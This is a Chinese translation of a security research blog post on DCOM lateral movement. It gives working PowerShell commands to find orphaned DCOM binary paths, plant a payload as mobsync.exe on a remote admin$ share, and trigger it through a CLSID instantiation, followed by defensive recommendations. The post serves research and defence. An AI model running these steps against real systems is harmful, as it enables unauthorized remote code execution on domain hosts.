> 原文链接: https://www.anquanke.com//post/id/107097 


# 如何滥用DCOM实现横向渗透


                                阅读量   
                                **145188**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://bohops.com/
                                <br>原文地址：[https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/](https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01a59916362193b5dd.jpg)](https://p1.ssl.qhimg.com/t01a59916362193b5dd.jpg)

## 一、前言

在本文中我们讨论了如何利用DCOM实现横向渗透以及执行载荷，主要原理是找到特定的DCOM注册表键值，这些键值指向“远程”主机上并不存在一些二进制程序。如果`\targetadmin$system32`目录中不存在`mobsync.exe`，那么这种方法很有可能行之有效，而这刚好是Windows 2008 R2以及Windows 2012 R2操作系统上的默认设置。如果我们具备目标主机的管理员权限（通过PowerShell接口），那么我们可以执行如下操作：

```
- dir \targetsystem32mobsync.exe   //该文件应该不存在
- copy evil.exe \targetadmin$system32mobsync.exe
- [activator]::CreateInstance([type]::GetTypeFromCLSID("C947D50F-378E-4FF6-8835-FCB50305244D","target"))
```

在本文中，我们将回顾一种“新颖的”、“简单”的方法，通过滥用DCOM（Distributed Component Object Model）实现远程载荷执行以及横向渗透。一般来说，这种技术相对比较原始，但可以作为其他常用的已知方法的替代方案。本文的主要内容包括：

1、简单介绍DCOM横向渗透技术（附带参考资料）；

2、本文的研究动机；

3、“并不复杂的”DCOM横向渗透方法；

4、建议防御方如何检测/防御此类攻击。



## 二、DCOM背景

在过去的一年半时间内，已经有许多人详细介绍了DCOM横向渗透技术。Matt Nelson（[enigma0x3](https://twitter.com/enigma0x3)）身先士卒，发表了一系列非常棒的[文章](https://enigma0x3.net/)，介绍了利用`MMC20.Application`、`ShellWindows`、`ShellBrowserWindow`、`Excel.Application`以及`Outlook.Application`等D/COM对象的一些横向渗透技术。Philip Tsukerman（[WMI](https://twitter.com/HITBSecConf/status/984814105151275009)横向渗透技术，也发表了一篇优秀的[文章](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)，介绍了DCOM功能的相关背景、横向渗透技术以及防御建议等。几个月之前，我发表了一篇[文章](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)，介绍了如何滥用`ShellWindows`及`ShellBrowserWindow`的`Navigate`以及`Navigate2`函数，启动可执行文件或者“url”文件，在远程主机上执行攻击载荷。在继续阅读本文之前，我强烈建议大家阅读一下这些资料。

请注意：本文提到的这些想法以及样例可能对资深攻击者来说可能有点小儿科，然而，我相信许多睿智的攻击者会基于风险评估来衡量什么才是最好的操作，因此他们很有可能不会每次都拿出他们的看家本领、工具、策略以及步骤来实现其预期效果以及/或者目标。因此，这里介绍的技术和方法仍然有其价值所在。



## 三、研究动机

几星期之前，我决定虚拟化处理一台老旧笔记本上的操作系统。转换过程非常痛苦，排除一些故障后（伴随着大量重启操作），我终于成功完成虚拟化，配置了正确的虚拟化驱动以及工具。然而，我想研究下这个决定是否足够安全，物理主机上有没有遗留的一些“有趣”的东西。我没有什么规章法则可以遵循，也没有兴趣去做数字取证。我选择好好研究一下注册表，并且很快就找到了一个有趣的CLSID注册表路径，该路径引用了一个二进制文件，该文件很可能是老笔记本上为某个（驱动）程序提供实用功能或者诊断功能的一个程序：

[![](https://p5.ssl.qhimg.com/t0127952730cd2902e3.png)](https://p5.ssl.qhimg.com/t0127952730cd2902e3.png)

通过简单的DIR命令，我们就知道磁盘上并不存在`C:WINDOWSsystem32IntelCpHDCPSvc.exe`这个程序：

[![](https://p5.ssl.qhimg.com/t01cfc1c5f8c5f06aab.png)](https://p5.ssl.qhimg.com/t01cfc1c5f8c5f06aab.png)

首先映入我脑海的是四个想法：

1、我并不知道`IntelCpHDCPSvc.exe`究竟是什么；

2、卸载程序并没有完全卸载老软件的所有注册表项；

3、我应该更仔细地检查和信任主机上那些软件（这又是另一个话题了）；

4、这看起来像是一个DCOM应用（我们可以使用`Get-CimInstance Win32_DCOMApplication`查询语句验证这一点）：

[![](https://p2.ssl.qhimg.com/t019778b99a0279b6ed.png)](https://p2.ssl.qhimg.com/t019778b99a0279b6ed.png)

经过一番Google后，我发现`IntelCpHDCPSvc.exe`与Intel的内容保护HDCP服务（Intel Content Protection HDCP Service）有关，但对我而言最有意思的是，**LocalServer32**以及**InProcServer32**这两个注册表项指向了本应该存在的二进制文件路径，这些不存在的文件可能会带来一些安全隐患。由于实际攻击中我们很少看到`IntelCpHDCPSvc`的身影，因此我想看看能否找到机会，利用Microsoft Windows Server上已有的、“被遗忘的”DCOM做些坏事。



## 四、 利用“被遗忘的”DCOM进行横向渗透

### <a class="reference-link" name="%E5%AE%9A%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6"></a>定位二进制

第一步就是在DCOM应用中找到合适的二进制文件路径。为了完成这个任务，我编写了非常粗糙的PowerShell命令，从打上完整补丁的Windows Server 2012上获取**LocalServer32**可执行文件以及**InProcServer32** DLL信息，具体命令如下：

```
gwmi Win32_COMSetting -computername 127.0.0.1 | ft LocalServer32 -autosize | Out-String -width 4096 | out-file dcom_exes.txt

gwmi Win32_COMSetting -computername 127.0.0.1 | ft InProcServer32 -autosize | Out-String -width 4096 | out-file dcom_dlls.txt
```

格式化输出结果并删除冗余信息后，我们可以从Windows 2012主机上得到如下信息：

[![](https://p5.ssl.qhimg.com/t012a4f574698cc4e0c.png)](https://p5.ssl.qhimg.com/t012a4f574698cc4e0c.png)

将两个结果文件拼接起来，删除某些参数字符串后，我们可以使用如下命令测试这些文件在磁盘上的存活情况：

```
$file = gc C:Userstestdesktopdcom_things.txt
foreach ($binpath in $file) `{`
 $binpath
 cmd.exe /c dir $binpath &gt; $null
`}`
```

很快就能得到结果：

```
%SystemRoot%system32mobsync.exe
File Not Found
```

这个文件的确不存在，如下图所示：

[![](https://p1.ssl.qhimg.com/t0129fddecae6830847.png)](https://p1.ssl.qhimg.com/t0129fddecae6830847.png)

根据[How-To Geek](https://www.howtogeek.com/howto/8668/what-is-mobsync.exe-and-why-is-it-running/)的描述，`mobsync`是“Microsoft同步中心以及脱机文件功能的一个进程”。了解这一点非常好，但因为其他原因，`mobsync.exe`又开始变得非常有趣起来……

### <a class="reference-link" name="%E9%AA%8C%E8%AF%81AppID%E4%BB%A5%E5%8F%8ACLSID"></a>验证AppID以及CLSID

之前我并没有很好地掌握枚举对应的AppID以及CLSID的方法，因此我选择浏览注册表来查找这些信息，如下图所示：

[![](https://p1.ssl.qhimg.com/t016f662902485a2226.png)](https://p1.ssl.qhimg.com/t016f662902485a2226.png)

具体一点，在下一阶段中，我们需要`[C947D50F-378E-4FF6-8835-FCB50305244D]`这个CLSID来创建DCOM对象的实例。



## 五、远程载荷执行/横向渗透

现在我们已经找到了候选的D/COM对象，可以尝试下实现远程载荷执行。在继续处理之前，我们首先要注意满足如下条件：

1、为了远程实例化DCOM对象，我们必须拥有正确的权限，只要具备管理员权限就可以。

2、为了最大化利用载荷执行的价值，我们将以域环境为例进行渗透。在这个例子中，我们将假设自己已经取得了域管理员凭据，然后从Windows 10客户端出发，完成Windows 2012域控制器（DC）上的远程执行任务。

3、其他各种天时地利人和因素……

首先有请我们的恶意载荷登场，并且确保目标系统上并不存在`mobsync.exe`（添加的某些角色或者管理员的某些操作可能会影响这个条件）：

```
dir C:evil.exe
dir \acmedcadmin$system32mobsync.exe
```

[![](https://p2.ssl.qhimg.com/t018dbe3506e21e4ca3.png)](https://p2.ssl.qhimg.com/t018dbe3506e21e4ca3.png)

非常好！目标上并不存在`mobsync.exe`，并且我们的`evil.exe`载荷成功规避了各种类型的主机防御机制，因此我们可以将其拷贝到DC上：

```
copy C:evil.exe \acmedcadmin$system32mobsync.exe
dir \acmedcadmin$system32mobsync.exe
```

[![](https://p1.ssl.qhimg.com/t01c13eda8590c064d6.png)](https://p1.ssl.qhimg.com/t01c13eda8590c064d6.png)

由于我们的二进制程序对DCOM并不“感冒”，因此实例化过程应该会以失败告终，但还是可以成功触发载荷。我们可以来试一下：

```
[activator]::CreateInstance([type]::GetTypeFromCLSID("C947D50F-378E-4FF6-8835-FCB50305244D","target"))
```

在Windows 10这台域主机上情况如下：

[![](https://p3.ssl.qhimg.com/t01e581c46a9968a20b.png)](https://p3.ssl.qhimg.com/t01e581c46a9968a20b.png)

在Windows 2012域控上情况如下：

[![](https://p4.ssl.qhimg.com/t013c1fc8f67124134f.png)](https://p4.ssl.qhimg.com/t013c1fc8f67124134f.png)

非常好！“恶意的”`mobsync.exe`成功执行了我们的“恶意”`notepad.exe`载荷！



## 六、附加说明及其他“简单”的方法

对于Windows Server 2008来说这种技术也可能有效，因为默认情况下`mobsync.exe`并没有位于`system32`目录中。然而，Windows 2016服务器上`system32`目录中已经存在`mobsync.exe`。

还有其他一些方法有可能会达到类似的DCOM横向渗透效果。前面提到过，系统中有大量对DCOM“感冒”的二进制程序。比较简单的一种方法是（临时性地）“替换”其中某个程序，然后执行类似的调用操作。劫持远程主机上的`mshta.exe`在实际环境中可能也是一种方法，然而操控远程文件系统（比如文件的复制/移动操作、远程文件权限等）是非常令人头疼的事情，并且也会增加被检测到的风险。

另一种（比较乏味的）方法就是远程操控注册表，修改DCOM程序所对应的CLSID LocalServer32键值，将其指向磁盘上的另一个位置或者远程文件共享。与前一种方法类似，这种方法涉及到注册表权限以及修改操作，也会引入被检测到的额外风险。

对DCOM“感冒”的第三方应用、程序以及实用工具可能提供了一些机会，让我们定位“被遗忘的”DCOM路径，实现类似的横向渗透效果。`IntelCpHDCPSvc.exe`就是一个典型的例子，但可能并不是最好的选项。然而对某些单位来说，每隔几年就购买并布置全新的、干净的计算机设备是非常正常的一件事情。在设备“刷新”过程中，计算机需要进行维护、打补丁以及升级。删除特定的实用软件以及老的设备驱动后，计算机上很可能会残留一些东西（比如注册表中的DCOM配置信息），这也会给攻击者铺开横向渗透攻击路径。有恒心有毅力的攻击者可能会孜孜不倦地盯着这件事情。

其他版本的Windows上（包括客户端设备）可能会残留对某些DCOM程序的引用，如有需要大家可以尽情探索。



## 七、防御建议

### <a class="reference-link" name="%E5%8E%82%E5%95%86"></a>厂商

1、确保卸载实用软件时，删除遗留的DCOM注册表项；

2、不要在注册表中创建指向并不存在的二进制文件的DCOM程序路径。

### <a class="reference-link" name="%E7%BD%91%E7%BB%9C%E9%98%B2%E5%BE%A1%E6%96%B9"></a>网络防御方

1、总的说来，防御方应该认真阅读[@enigma0x3](https://github.com/enigma0x3)以及[@PhilipTsukerman](https://github.com/PhilipTsukerman)在博客中给出的建议，针对性地捕捉相关IOC；

2、想使用这些DCOM方法（通常）需要远程主机的特权访问。请保护具备高级权限的域账户，避免本地主机账户复用密码凭据；

3、请确保部署了深度防御控制策略、基于主机的安全产品并监控主机，以检测/阻止可以活动。启用基于主机的防火墙可以阻止RPC/DCOM交互及实例化操作；

4、监控文件系统（以及注册表），关注新引入的元素以及改动；

5、监控环境中可疑的PowerShell操作。如有可能，请强制启用PowerShell的“Constrained Language Mode（约束语言模式）”（这对特权账户来说可能有点难）；

6、在DCOM调用“失败”时，目标主机上的System日志中会生成ID为10010的事件（Error, DistributedCOM），其中包含CLSID信息。

[![](https://p5.ssl.qhimg.com/t01875839ae8c432034.png)](https://p5.ssl.qhimg.com/t01875839ae8c432034.png)



## 八、总结

感谢大家阅读本文，如有意见和建议，欢迎随时联系我。
